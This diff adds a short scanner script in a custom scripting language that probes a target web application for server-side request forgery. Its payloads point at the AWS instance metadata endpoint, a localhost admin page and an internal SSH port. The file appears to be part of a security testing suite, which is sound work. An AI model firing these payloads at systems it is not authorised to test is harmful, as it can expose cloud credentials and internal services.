@@ -1,0 +1,47 @@
+# SSRF Check
+# Tests for Server-Side Request Forgery vulnerabilities
+
+if $ARGC < 1 then
+    print "ERROR: Missing target URL"
+    set $stop 1
+else
+    set $target $ARG1
+    set $stop 0
+endif
+
+if $stop == 0 then
+    print "[SCAN] SSRF Testing"
+    print "Target: $target"
+    
+    set $ssrf_found 0
+    
+    # Test 1: URL parameter SSRF
+    GET "$target/fetch?url=http://169.254.169.254/latest/meta-data/"
+    if response contains "ami-id" then
+        print "[CRITICAL] SSRF to AWS metadata"
+        print "  URL: $target/fetch"
+        set $ssrf_found $ssrf_found + 1
+    endif
+    
+    # Test 2: Image URL SSRF
+    GET "$target/image?src=http://localhost:8080/admin"
+    extract status as $img_status
+    if $img_status equals 200 then
+        if response contains "admin" then
+            print "[HIGH] SSRF via image parameter"
+            print "  URL: $target/image"
+            set $ssrf_found $ssrf_found + 1
+        endif
+    endif
+    
+    # Test 3: Redirect SSRF
+    GET "$target/redirect?url=http://127.0.0.1:22"
+    extract status as $redirect_status
+    if $redirect_status equals 200 then
+        print "[MEDIUM] Open redirect to internal services"
+        print "  URL: $target/redirect"
+        set $ssrf_found $ssrf_found + 1
+    endif
+    
+    print "[✓] Completed: 0010_ssrf - Found $ssrf_found of 3 vulnerabilities tested"
+endif
